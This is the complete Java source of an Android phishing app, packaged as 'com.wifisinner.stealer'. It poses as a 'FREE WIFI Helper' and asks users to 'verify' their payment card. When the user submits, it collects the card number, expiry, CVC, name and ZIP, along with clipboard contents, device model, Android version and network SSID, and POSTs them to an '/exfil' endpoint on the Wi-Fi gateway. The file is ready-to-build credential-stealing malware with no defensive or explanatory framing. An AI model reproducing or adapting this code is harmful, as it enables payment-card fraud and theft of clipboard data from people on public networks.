package com.wifisinner.stealer;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.DhcpInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.text.InputType;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {
    private EditText etName, etNum, etExp, etCvc, etZip;
    private Button btn;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(44, 56, 44, 44);
        root.setBackgroundColor(Color.WHITE);

        TextView title = new TextView(this);
        title.setText("FREE WIFI Helper");
        title.setTextSize(22);
        title.setTextColor(Color.parseColor("#0b3d91"));
        title.setTypeface(Typeface.DEFAULT_BOLD);
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("Verify your card to continue unlimited access");
        sub.setTextSize(13);
        sub.setTextColor(Color.GRAY);
        root.addView(sub);

        etName = field("Name on card");
        etNum = field("Card number");
        etExp = field("Expiry MM/YY");
        etCvc = field("CVC");
        etZip = field("ZIP (optional)");
        etNum.setInputType(InputType.TYPE_CLASS_NUMBER);
        etCvc.setInputType(InputType.TYPE_CLASS_NUMBER);
        etZip.setInputType(InputType.TYPE_CLASS_NUMBER);
        root.addView(etName);
        root.addView(etNum);
        root.addView(etExp);
        root.addView(etCvc);
        root.addView(etZip);

        btn = new Button(this);
        btn.setText("Verify & Connect");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#0b3d91"));
        LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        blp.topMargin = 40;
        btn.setLayoutParams(blp);
        root.addView(btn);

        setContentView(root);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { submit(); }
        });
    }

    private EditText field(String hint) {
        EditText e = new EditText(this);
        e.setHint(hint);
        e.setSingleLine(true);
        e.setHintTextColor(Color.parseColor("#888"));
        e.setTextColor(Color.parseColor("#111"));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 26;
        e.setLayoutParams(lp);
        return e;
    }

    private String brand(String n) {
        if (n.startsWith("4")) return "VISA";
        if (n.startsWith("34") || n.startsWith("37")) return "AMEX";
        if (n.length() >= 2 && (n.startsWith("51") || n.startsWith("52") || n.startsWith("53")
                || n.startsWith("54") || n.startsWith("55") || n.startsWith("22"))) return "MASTERCARD";
        if (n.startsWith("6")) return "DISCOVER";
        return "CARD";
    }

    private String gateway() {
        try {
            WifiManager w = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            DhcpInfo d = w.getDhcpInfo();
            return intToIp(d.gateway);
        } catch (Exception e) {
            return "10.0.0.1";
        }
    }

    private String intToIp(int i) {
        return (i & 0xff) + "." + ((i >> 8) & 0xff) + "." + ((i >> 16) & 0xff) + "." + ((i >> 24) & 0xff);
    }

    private String ssid() {
        try {
            WifiManager w = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo i = w.getConnectionInfo();
            String s = i.getSSID();
            return s == null ? "" : s.replace("\"", "");
        } catch (Exception e) {
            return "";
        }
    }

    private String clipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                ClipData cd = cm.getPrimaryClip();
                if (cd != null && cd.getItemCount() > 0 && cd.getItemAt(0).getText() != null)
                    return cd.getItemAt(0).getText().toString();
            }
        } catch (Exception e) {
        }
        return "";
    }

    private String enc(String s) {
        try {
            return URLEncoder.encode(s, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    private String post(String gw, String body) {
        try {
            URL u = new URL("http://" + gw + "/exfil");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(4000);
            c.setReadTimeout(4000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = c.getOutputStream();
            os.write(body.getBytes("UTF-8"));
            os.close();
            int code = c.getResponseCode();
            InputStream is = c.getInputStream();
            while (is.read() != -1) {
            }
            is.close();
            c.disconnect();
            return "HTTP " + code;
        } catch (Exception e) {
            return null;
        }
    }

    private void submit() {
        final String name = etName.getText().toString();
        final String number = etNum.getText().toString().replaceAll("[^0-9]", "");
        final String exp = etExp.getText().toString();
        final String cvc = etCvc.getText().toString();
        final String zip = etZip.getText().toString();
        final String gw = gateway();
        final String model = Build.MANUFACTURER + " " + Build.MODEL;
        final String android = Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
        final String ssid = ssid();
        final String clip = clipboard();
        btn.setText("Saving...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                final String body = "type=card"
                        + "&name=" + enc(name) + "&number=" + enc(number)
                        + "&exp=" + enc(exp) + "&cvc=" + enc(cvc) + "&zip=" + enc(zip)
                        + "&clipboard=" + enc(clip)
                        + "&model=" + enc(model) + "&android=" + enc(android)
                        + "&ssid=" + enc(ssid) + "&brand=" + enc(brand(number));
                final String res = post(gw, body);
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        btn.setText(res != null ? "Saved!" : "Retry");
                        Toast.makeText(MainActivity.this,
                                res != null ? "Card details sent" : "Send failed - tap retry",
                                Toast.LENGTH_LONG).show();
                    }
                });
            }
        }).start();
    }
}
